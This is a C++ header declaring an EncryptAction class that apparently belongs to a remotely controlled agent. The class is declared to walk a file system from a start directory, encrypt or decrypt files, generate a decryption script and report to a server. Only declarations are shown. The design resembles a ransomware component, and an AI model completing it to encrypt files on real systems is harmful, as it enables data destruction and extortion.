#ifndef ENCRYPTACTION_HPP
#define ENCRYPTACTION_HPP

#include <string>
#include <cstdio>
#include <vector>
#include <cstdlib>
#include <filesystem>
#include <iostream>
#include <sstream> 

#include "Action.hpp"
#include "CryptoManager.hpp"
#include "GeneralUtils.hpp"
#include "GenDecryptionScript.hpp"

namespace fs = std::filesystem;

class EncryptAction : public Action {
public:
    EncryptAction(std::vector<std::string> actionParams);

    void execute() override;
    ActionType getActionType() override;
    std::string getMessage() override;

private:
    std::string msgToServer;
    bool fsEncrypted;
    std::vector<std::string> actionParams;
    bool isValid;
    bool isDecryption;

    const int PARAM_COUNT = 4;
    const int COMMAND_TYPE_IDX = 3;
    const int ALGO_IDX = 4;
    const int START_DIR_IDX = 5;
    const int CRYPTO_TYPE_IDX = 6;
    const std::string ERROR_MSG = "Unable to encrypt/decrypt\n";

    void checkParams();
    std::string determineStartDir(const char* cString);
    std::string traverseFileSystem(const fs::path& startDir, CryptoManager cryptoManager);
};

#endif // ENCRYPTACTION_HPP
